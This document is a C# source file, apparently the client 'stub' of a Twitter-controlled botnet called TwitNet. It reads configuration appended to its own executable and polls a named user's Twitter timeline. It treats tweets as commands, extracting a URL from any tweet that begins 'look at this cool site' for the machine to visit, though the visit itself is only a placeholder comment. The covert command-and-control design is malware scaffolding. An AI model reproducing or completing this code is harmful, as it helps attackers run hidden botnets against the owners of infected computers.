using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using Microsoft.VisualBasic;
using System.Net;
using System.Xml;
using System.Text.RegularExpressions;

namespace TwitNet_Stub
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
            string[] AppendData = Strings.Split(Encoding.Default.GetString(stub), Util.Splitter, -1, CompareMethod.Text);

            string user = AppendData[1];

            WebClient client = new WebClient();
            string tweet = GetTweet(client.DownloadString("http://api.twitter.com/1/statuses/user_timeline/" + user + ".xml"));


            if (tweet.StartsWith("look at this cool site"))
            {
                string website = Regex.Split(tweet, "cool site")[1];
                MessageBox.Show(website);
                //visit website
            }
        }

        /// <summary>
        /// Parse XML
        /// </summary>
        /// <param name="xmlString">xml data</param>
        private string GetTweet(string xmlString)
        {
            try
            {
                using (XmlReader MyReader = XmlReader.Create(new StringReader(xmlString)))
                {
                    while (MyReader.Read())
                    {
                        if ((MyReader.NodeType == XmlNodeType.Element) & (MyReader.Name == "text"))
                        {
                            return MyReader.ReadElementContentAsString();
                        }
                    }
                }
            }
            catch (Exception ex) { return ex.Message; }
            return "err";
        }
    }
}
